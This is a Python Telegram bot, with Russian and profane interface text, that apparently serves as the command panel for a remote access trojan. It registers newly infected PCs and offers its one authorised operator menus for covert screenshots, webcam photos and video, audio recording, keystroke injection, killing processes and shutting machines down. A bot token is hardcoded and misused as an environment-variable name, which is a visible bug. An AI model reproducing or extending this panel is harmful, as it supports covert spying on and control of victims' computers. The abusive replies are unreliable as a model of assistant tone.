```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sqlite3
import random
import time
import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

# Настройки
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("7989938055:AAHk9IN-raJtqB8pvCoIDFduQnK42JLYhE4")
ALLOWED_USER_ID = 6710064443
last_command_time = 0
COOLDOWN = 2
current_device = {}

# Грубые ответы
STUPID_RESPONSES = [
    "Ты что, дебил? Такой команды нет! Пиши /start",
    "Да иди ты нахуй со своими командами, пиши /start!",
    "Охуеть, опять ты хуйню написал! Пиши /start",
    "Блять, научись уже пользоваться ботом, даун! Пиши /start",
    "Нет такой команды, кретин! Пиши /start"
]

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Главное меню
def create_main_menu():
    return types.ReplyKeyboardMarkup(
        keyboard=[
            [types.KeyboardButton(text="📱 Устройства")],
            [types.KeyboardButton(text="📂 Создать файл")]
        ],
        resize_keyboard=True
    )

# Меню действий для устройства
def create_device_menu(device_name):
    return types.ReplyKeyboardMarkup(
        keyboard=[
            [types.KeyboardButton(text="📸 Скриншот"), types.KeyboardButton(text="📸 Фото с веб-камеры")],
            [types.KeyboardButton(text="🎥 Сделать видео"), types.KeyboardButton(text="🎥 Видео с веб-камеры")],
            [types.KeyboardButton(text="🎙 Запись звука"), types.KeyboardButton(text="💬 Написать сообщение")],
            [types.KeyboardButton(text="🛡 Антивирус"), types.KeyboardButton(text="📊 Процессы")],
            [types.KeyboardButton(text="💀 Завершить процесс"), types.KeyboardButton(text="💀 Завершить определённый процесс")],
            [types.KeyboardButton(text="⌨️ Нажать комбинацию клавиш"), types.KeyboardButton(text="⬇️ Свернуть окно")],
            [types.KeyboardButton(text="📥 Свернуть все"), types.KeyboardButton(text="🖱 Дергать мышкой")],
            [types.KeyboardButton(text="🔊 Включить звук"), types.KeyboardButton(text="🔇 Выключить звук")],
            [types.KeyboardButton(text="🔌 Выключить ПК"), types.KeyboardButton(text="🔄 Перезагрузить ПК")],
            [types.KeyboardButton(text="🔙 Назад к устройствам")]
        ],
        resize_keyboard=True
    )

# Меню списка устройств
def create_devices_menu():
    devices = get_devices()
    keyboard = []
    for device in devices:
        keyboard.append([types.KeyboardButton(text=f"❓ {device[0]}")])
    keyboard.append([types.KeyboardButton(text="🔙 Назад в меню")])
    return types.ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

# Функции базы данных
def get_devices():
    devices = []
    try:
        conn = sqlite3.connect("devises.db")
        cursor = conn.cursor()
        cursor.execute("SELECT name, last_seen, status FROM devices ORDER BY last_seen DESC")
        devices = [(row[0], row[1], row[2]) for row in cursor.fetchall()]
        conn.close()
    except Exception as e:
        logger.error(f"Ошибка базы данных: {e}")
    return devices

def add_device(pc_name):
    try:
        conn = sqlite3.connect("devises.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO devices (name, last_seen, status) VALUES (?, datetime('now'), ?)", (pc_name, "Неизвестно"))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Ошибка базы данных при добавлении устройства: {e}")

# Обработчики
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    current_device[message.from_user.id] = None
    await message.answer("👊 Привет, дебил! Жми /menu.", reply_markup=create_main_menu())

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    current_device[message.from_user.id] = None
    await message.answer("📋 Выбери действие, дебил:", reply_markup=create_main_menu())

@dp.message(lambda message: message.text == "📱 Устройства")
async def handle_devices(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    await message.answer("📋 Устройства:", reply_markup=create_devices_menu())

@dp.message(lambda message: message.text.startswith("❓ "))
async def handle_device_select(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    device_name = message.text[2:]
    current_device[message.from_user.id] = device_name
    await message.answer(f"📱 {device_name}", reply_markup=create_device_menu(device_name))

@dp.message(lambda message: message.text == "🔙 Назад к устройствам")
async def handle_back_to_devices(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    await message.answer("📋 Устройства:", reply_markup=create_devices_menu())

@dp.message(lambda message: message.text == "🔙 Назад в меню")
async def handle_back_to_menu(message: types.Message):
    global last_command_time
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    current_time = time.time()
    if current_time - last_command_time < COOLDOWN:
        spam_message = await message.answer(f"🖕 Хватит спамить, дебил! Жди {COOLDOWN} сек!")
        await asyncio.sleep(COOLDOWN)
        await bot.delete_message(chat_id=message.chat.id, message_id=spam_message.message_id)
        return
    
    last_command_time = current_time
    current_device[message.from_user.id] = None
    await message.answer("📋 Выбери действие, дебил:", reply_markup=create_main_menu())

@dp.message(lambda message: "🖥️ Новый ПК подключен:" in message.text)
async def handle_new_device(message: types.Message):
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    pc_name = message.text.replace("🖥️ Новый ПК подключен: ", "").split("🚀")[0].strip()
    if pc_name:
        add_device(pc_name)
        await message.answer(f"🖥️ Устройство {pc_name} добавлено, дебил!", reply_markup=create_devices_menu())

@dp.message()
async def handle_unknown(message: types.Message):
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("🖕 Похер, ты не мой хозяин!")
        return
    
    await message.answer(random.choice(STUPID_RESPONSES))

async def on_startup(_):
    webhook_url = os.environ.get("WEBHOOK_URL", f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/webhook")
    await bot.set_webhook(url=webhook_url)
    logger.info(f"Вебхук установлен: {webhook_url}")

async def on_shutdown(_):
    await bot.delete_webhook()
    logger.info("Вебхук удалён")

def main():
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot, secret_token="")
    webhook_requests_handler.register(app, path="/webhook")
    setup_application(app, dp, bot=bot)
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    web.run_app(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8443)))

if __name__ == "__main__":
    logger.info("🟢 Запуск бота в режиме вебхуков...")
    main()
```